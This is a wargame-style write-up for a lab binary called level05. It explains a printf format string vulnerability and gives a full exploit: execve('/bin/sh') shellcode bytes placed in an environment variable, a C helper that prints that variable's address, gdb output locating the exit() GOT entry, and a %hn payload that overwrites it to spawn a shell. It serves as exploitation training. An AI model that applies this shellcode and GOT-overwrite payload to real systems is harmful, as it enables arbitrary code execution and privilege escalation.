# Leve05

## What the binary does
The program:
- Reads 100 bytes using fgets().
- Applies a loop that scans and transforms any uppercase letters into lowercase (A–Z → a–z).
- Then it prints the input using printf(user_input), without a format string. (That’s a format string vulnerability)

The program ends with a call to exit(0), and the GOT entry for exit() is used.
This gives us a chance to overwrite the GOT to redirect execution.

## The idea
We overwrite the exit() GOT entry with the address of our shellcode, which we store in an environment variable.
That way, when the program calls exit(), it actually jumps to our shellcode.

##  Step-by-step

### 1. Prepare the shellcode
We inject our shellcode using the environment :
```
export SHELLCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

We put the shellcode in the environment because when we tried to send the shellcode directly in the command gdb and ltrace didn't gave use the same address.

### 2. Find the address of the shellcode
We write a small C program to print the environment variable address.
```
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *addr = getenv("SHELLCODE");
    if (addr) {
        printf("%p\n", addr);
    } else {
        printf("Address not found\n");
    }
    return 0;
}
``` 

We compiles it with the flag `-m32` to get an address in 32 bits.
```
gcc -m32 get_shellcode_addr.c
```

### 3. Locate the GOT entry for `exit`
In gdb:
```
(gdb) x/1w 0x080497e0
0x080497e0 <exit@got.plt>: 0xffffd6b8
```
We want to overwrite that address with the address of our shellcode.
Instead of writing all 4 bytes at once, we use two separate 2-byte writes using `%hn`.

#### Why?
Because:
- The full address 0xffffd91a in decimal is 4294953498. It is way too large to be handle directly in a %n-based format string.
- The printf() function has limitations when converting large values to decimal padding.
- Writing two smaller values like 0xd91a (55578) and 0xffff (65535) is simpler and more reliable.

### 4. The final payload
We’ll use format string specifiers like `%hn` (half-word write) to write the shellcode address in 2-byte chunks.
```
(python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%55570d%11$hn" + "%9957d%10$hn"'; cat) | ./level05
```

Addresses:
- \xe2\x97\x04\x08 → 0x080497e2 → second half of exit GOT
- \xe0\x97\x04\x08 → 0x080497e0 → first half of exit GOT


We want to write the shellcode address: 0xffffd91a

Split into:
- 0xd91a = 55578 (second half)
- 0xffff = 65535, and 65535 - 55578 = 9957 (first half minus second half)

We also need to subtract 8 bytes to the second half of the shellcode address because of the 8 bytes that we already write with the printf.

So:
- %55570d%11$hn → write 0xd91a at 0x080497e0
- %9957d%10$hn → write 0xffff at 0x080497e2

#### Why %10$hn, %11$hn?
Because of how the stack is laid out, we need to calculate the positions where the addresses we inject land.

We can do this by using this pattern:
```
python -c 'print "AAAA" + "%x "*20'
```